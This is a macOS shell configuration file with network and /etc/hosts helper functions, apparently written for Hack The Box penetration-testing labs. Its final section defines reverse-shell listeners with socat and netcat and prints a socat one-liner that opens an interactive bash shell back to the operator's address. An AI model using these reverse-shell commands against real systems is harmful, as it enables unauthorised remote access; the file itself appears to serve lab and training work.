# macOS-specific aliases

alias cf="caffeinate"

# IP via ifconfig + utun (macOS VPN interface naming)
alias vpnip='ifconfig | grep -A 2 "utun" | grep "inet " | awk "{print \$2}" | grep -v "127\." | tail -1'
alias htbip='ifconfig | grep -A 2 "utun" | grep "inet " | grep "10\.10\." | awk "{print \$2}" | head -1'
alias htbipc='htbip | pbcopy && htbip'

alias localip="ipconfig getifaddr en0"

# /etc/hosts helpers — sudo required
hostadd() {
  [ $# -lt 2 ] && { echo "usage: hostadd <ip> <host> [more-hosts...]"; return 1; }
  local ip="$1"; shift
  local line="$ip $*"
  if grep -qE "^[^#]*[[:space:]]$1([[:space:]]|$)" /etc/hosts 2>/dev/null; then
    echo "host already present, replacing:"
    sudo sed -i '' "/[[:space:]]$1\([[:space:]]\|$\)/d" /etc/hosts
  fi
  echo "$line" | sudo tee -a /etc/hosts >/dev/null && echo "+ $line"
}

hostrm() {
  [ -z "$1" ] && { echo "usage: hostrm <host>"; return 1; }
  sudo sed -i '' "/[[:space:]]$1\([[:space:]]\|$\)/d" /etc/hosts && echo "- $1"
}

# reverse-shell listeners
# socat PTY listener — tab, vim, ^C all work on catch
pwnshell() {
  local port="${1:-4444}"
  local ip; ip="$(htbip)"
  echo "[*] listening on :$port (socat PTY)"
  echo "[*] target one-liner:"
  echo "    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip:-<htbip>}:$port"
  socat file:"$(tty)",raw,echo=0 tcp-listen:"$port"
}

# nc fallback for when target lacks socat
pwnnc() {
  local port="${1:-4444}"
  echo "[*] listening on :$port (rlwrap nc)"
  rlwrap nc -lvnp "$port"
}
